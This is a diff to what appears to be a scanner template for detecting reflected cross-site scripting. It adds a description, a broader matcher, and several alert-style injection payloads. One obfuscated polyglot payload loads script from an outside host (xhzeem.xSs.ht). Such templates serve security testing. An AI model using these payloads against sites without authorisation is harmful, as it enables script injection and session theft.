@@ -1,5 +1,6 @@
 {
     "id":"xss",
+    "info":"XSS vulnerability allowes an attacker to inject malicious scripts in the urls.",
     "severity":"high",
     "request":{
         "method":"GET",
@@ -17,12 +18,16 @@
         {
             "type": "regex",
             "part": "body",
-            "regex": "alert\\(\\d\\)"
+            "regex": "\\balert\\(\\d\\)\\b|\\bxss\\b"
         }
     ],
-    "payloads":[
-    "<script>alert(1)</script>",
-    "''onclick=(co\u006efirm)?.`0`><sVg/i=oNload=(pro\u006dpt)`1`></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//xhzeem.xSs.ht></scripT>"
+    "payloads": [
+        "<script>alert(1)<\\/script>",
+        "''onclick=(co\\u006efirm)?.`0`><sVg/i=oNload=(pro\\u006dpt)`1`></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//xhzeem.xSs.ht><\\/scripT>",
+        "<img src=\\\"x\\\" onerror=\\\"alert(4);\\\">",
+        "<body onload=\\\"alert(5);\\\">",
+        "<a href=\\\"javascript:alert(6);\\\">Click me<\\/a>"
     ]
+    
 
 }
